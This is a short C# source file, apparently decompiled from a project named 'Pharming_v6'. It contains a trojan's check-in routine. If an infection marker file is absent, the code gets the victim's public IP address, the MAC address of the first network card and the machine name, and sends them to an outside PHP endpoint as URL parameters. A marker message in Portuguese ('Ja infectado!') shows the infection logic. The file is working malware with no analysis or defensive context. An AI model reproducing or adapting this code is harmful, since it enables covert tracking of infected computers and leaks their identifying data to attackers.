using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class enviophp
{
	public static void enviophp()
	{
		if (File.Exists(Module1.temp + "\\checkinfect.txt"))
		{
			Console.WriteLine("Ja infectado!");
			return;
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://automation.whatismyip.com/n09230945.asp");
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text = streamReader.ReadToEnd();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		string text2 = allNetworkInterfaces[0].GetPhysicalAddress().ToString();
		string machineName = Environment.MachineName;
		WebClient webClient = new WebClient();
		webClient.DownloadString("http://girls.monsterenergy.com/mobile/en.php?nomepc=" + machineName + "&osName=" + Module1.osName + "&netCard=" + text2 + "&ipp=" + text);
	}
}
